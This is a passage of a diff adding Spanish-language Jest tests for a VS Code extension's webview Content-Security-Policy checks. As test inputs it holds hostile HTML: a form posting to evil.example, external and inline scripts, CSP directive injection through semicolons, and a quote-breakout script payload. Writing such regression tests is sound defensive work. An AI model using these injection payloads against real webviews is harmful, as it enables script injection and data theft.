+        expect(findWebviewHtmlViolations(conNonce('<form action="https://evil.example/rob"></form>')))
+            .toContainEqual(expect.stringContaining('recurso remoto en <form action>'));
+        expect(findWebviewHtmlViolations(conNonce('<base href="https://evil.example/">')))
+            .toContainEqual(expect.stringContaining('<base> presente'));
+    });
+
+    test('un <script> sin nonce sigue cayendo', () => {
+        expect(findWebviewHtmlViolations(conNonce('<script>alert(1)</script>')))
+            .toContainEqual(expect.stringContaining('<script> sin nonce'));
+    });
+});
+
+// ---------------------------------------------------------------------------
+// CASOS ROJOS · D3 — presencia de meta ≠ política, y HTML de disco
+// ---------------------------------------------------------------------------
+
+describe('WP-V66 · D3 · la meta CSP se valida, no se cuenta', () => {
+    const META_OK = `<meta http-equiv="Content-Security-Policy" content="default-src 'none';">`;
+
+    test('meta CSP dentro de un comentario HTML NO cuenta', () => {
+        const html = `<!DOCTYPE html><html><head><!-- ${META_OK} --></head><body></body></html>`;
+        expect(stripHtmlComments(html)).not.toContain('Content-Security-Policy');
+        expect(extractCspMetaContents(html)).toEqual([]);
+        expect(findWebviewHtmlViolations(html))
+            .toContainEqual(expect.stringContaining('sin meta Content-Security-Policy'));
+    });
+
+    test('meta CSP permisiva o vacía NO cuenta', () => {
+        const permisiva = `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'"></head></html>`;
+        expect(findWebviewHtmlViolations(permisiva).length).toBeGreaterThan(0);
+
+        const vacia = `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content=""></head></html>`;
+        expect(findWebviewHtmlViolations(vacia))
+            .toContainEqual(expect.stringContaining("no arranca en default-src 'none'"));
+    });
+
+    test('verifyDiskHtml sustituye por página de error todo HTML de disco hostil', () => {
+        const casos = [
+            `<!DOCTYPE html><html><head><!-- ${META_OK} --></head><body><script>evil()</script></body></html>`,
+            `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head></html>`,
+            `<!DOCTYPE html><html><head>${META_OK}</head><body><script src="https://evil.example/x.js"></script></body></html>`,
+            `<html><body onload="evil()"></body></html>`
+        ];
+        for (const hostil of casos) {
+            const servido = verifyDiskHtml(hostil, '/disco/index.html');
+            expect(servido).toContain('Local content rejected');
+            // lo que se sirve en su lugar cumple la política...
+            expect(findWebviewHtmlViolations(servido)).toEqual([]);
+            // ...y del HTML hostil no sobrevive ningún marcado vivo: si la
+            // URL o el handler aparecen, es escapados dentro de un <p>.
+            expect(servido).not.toMatch(/<script(?![^>]*nonce=)/i);
+            expect(servido).not.toMatch(/\son[a-z]+\s*=\s*["']/i);
+            expect(servido).not.toMatch(/<[^>]*evil\.example[^>]*>/i);
         }
+    });
+
+    test('verifyDiskHtml deja pasar el HTML de disco que sí cumple', () => {
+        const bueno = renderWebviewPlaceholderPage('Local');
+        expect(verifyDiskHtml(bueno, '/disco/index.html')).toBe(bueno);
+    });
+
+    test('los scripts de un panel de disco son opt-in, no el defecto', () => {
+        const src = require('fs').readFileSync(path.join(SRC_ROOT, 'webViewManager.ts'), 'utf8');
+        expect(src).toContain('enableScripts: config.enableScripts === true');
+        expect(src).not.toContain('enableScripts: config.enableScripts !== false');
+    });
+});
+
+// ---------------------------------------------------------------------------
+// CASOS ROJOS · D4 — fuentes de style/img/font sin validar ni escapar
+// ---------------------------------------------------------------------------
+
+describe('WP-V66 · D4 · toda fuente CSP pasa por lista blanca', () => {
+    test('orígenes externos y comodines LANZAN en style/img/font', () => {
+        expect(() => buildCspContent({ styleSource: 'https://evil.example' })).toThrow();
+        expect(() => buildCspContent({ styleSource: '*' })).toThrow();
+        expect(() => buildCspContent({ imgSource: 'https://tracker.example' })).toThrow();
+        expect(() => buildCspContent({ imgSource: '*' })).toThrow();
+        expect(() => buildCspContent({ fontSource: 'https://fonts.gstatic.com' })).toThrow();
+        expect(() => buildCspContent({ fontSource: 'data:' })).toThrow();
+    });
+
+    test('inyección de directivas por `;` LANZA (no acaba en script-src *)', () => {
+        expect(() => buildCspContent({ styleSource: "vscode-resource:; script-src *" })).toThrow();
+        expect(() => buildCspContent({ imgSource: "vscode-resource:;script-src https://evil.example" })).toThrow();
+    });
+
+    test('breakout del atributo content= por `"` LANZA (no inyecta <script> en el head)', () => {
+        const payload = `vscode-resource:"><script>alert(1)</script><meta x="`;
+        expect(() => buildCspContent({ styleSource: payload })).toThrow();
+        expect(() => buildCspMeta({ styleSource: payload })).toThrow();
+    });
+
+    test('las fuentes legítimas siguen pasando (cspSource real de VS Code)', () => {
+        expect(buildCspContent({ styleSource: 'vscode-resource:' })).toContain('style-src vscode-resource:');
+        expect(buildCspContent({ styleSource: 'vscode-webview-resource:' })).toContain('vscode-webview-resource:');
+        expect(buildCspContent({ styleSource: 'https://*.vscode-cdn.net' })).toContain('https://*.vscode-cdn.net');
+        expect(buildCspContent({ imgSource: "'self'" })).toContain("img-src 'self'");
+        expect(isAllowedCspSourceToken("'none'")).toBe(true);
+        expect(isAllowedCspSourceToken('*')).toBe(false);
+        expect(isAllowedCspSourceToken('https://evil.example')).toBe(false);
+    });
+
+    test('un nonce que no es base64 LANZA', () => {
+        expect(() => buildCspContent({ scriptNonce: "abc' 'self" })).toThrow();
+        expect(() => buildCspContent({ styleNonce: 'abc;script-src *' })).toThrow();
+    });
+});
+
+// ---------------------------------------------------------------------------
+// CASOS ROJOS · D5 — la SEGUNDA meta CSP también se mira
+// ---------------------------------------------------------------------------
+
+describe('WP-V66 · D5 · se validan TODAS las metas CSP, no la primera', () => {
+    test('una segunda meta permisiva pone el documento en rojo', () => {
+        const nonce = createNonce();
+        const html = `<!DOCTYPE html><html><head>
+            ${buildCspMeta({ scriptNonce: nonce })}
+            <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'">
+            </head><body></body></html>`;
+        expect(extractCspMetaContents(html)).toHaveLength(2);
+        expect(findWebviewHtmlViolations(html).length).toBeGreaterThan(0);
+        expect(isSafeWebviewHtml(html)).toBe(false);
+    });
+
+    test('una segunda meta con fuente externa también cae', () => {
+        const nonce = createNonce();
+        const html = `<!DOCTYPE html><html><head>
+            ${buildCspMeta({ scriptNonce: nonce })}
+            <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src https://tracker.example;">
+            </head><body></body></html>`;
+        expect(findWebviewHtmlViolations(html))
+            .toContainEqual(expect.stringContaining('fuente no admitida en CSP: "https://tracker.example"'));
     });
 });
